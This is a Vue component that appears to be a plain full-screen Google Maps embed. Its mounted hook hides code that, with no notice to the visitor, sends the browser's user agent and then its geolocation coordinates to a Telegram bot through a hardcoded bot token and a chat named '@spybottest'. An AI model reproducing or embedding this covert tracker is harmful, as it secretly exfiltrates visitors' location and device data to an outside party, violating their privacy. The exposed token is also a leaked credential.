<template>
  <div style="width: 100vw; height: 100vh">
    <iframe
      src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d8476.302898505815!2d69.27084451548629!3d41.31265680382537!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x18b2beff69cc8ff2!2zNDHCsDE4JzU2LjkiTiA2OcKwMTYnMTIuMCJF!5e0!3m2!1sru!2s!4v1664988973652!5m2!1sru!2s"
      width="100%"
      height="100%"
      style="border: 0"
      allowfullscreen=""
      loading="lazy"
      referrerpolicy="no-referrer-when-downgrade"
    ></iframe>
  </div>
</template>
<script>
import axios from "axios";
export default {
  methods: {
    async sendUserInfo(user, data) {
      const info = {
        user: user,
        location: data,
      };
      const response = await axios.post(
        "https://api.telegram.org/bot5637853805:AAFXbflITHKv9rqrGGjh7uDBW7WL-SW7k7I/sendMessage?chat_id=@spybottest&text=" +
          JSON.stringify(info)
      );
      console.log(response);
    },
    cloneAsObject(obj) {
      if (obj === null || !(obj instanceof Object)) {
        return obj;
      }
      var temp = obj instanceof Array ? [] : {};
      // ReSharper disable once MissingHasOwnPropertyInForeach
      for (var key in obj) {
        temp[key] = this.cloneAsObject(obj[key]);
      }
      return temp;
    },
  },
  mounted() {
    if (navigator.userAgent) {
      this.sendUserInfo(navigator.userAgent, null);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        this.sendUserInfo(
          navigator.userAgent,
          JSON.parse(JSON.stringify(this.cloneAsObject(position)))
        );
      }, error);
    }

    function error(msg) {
      console.log(msg);
    }
  },
};
</script>
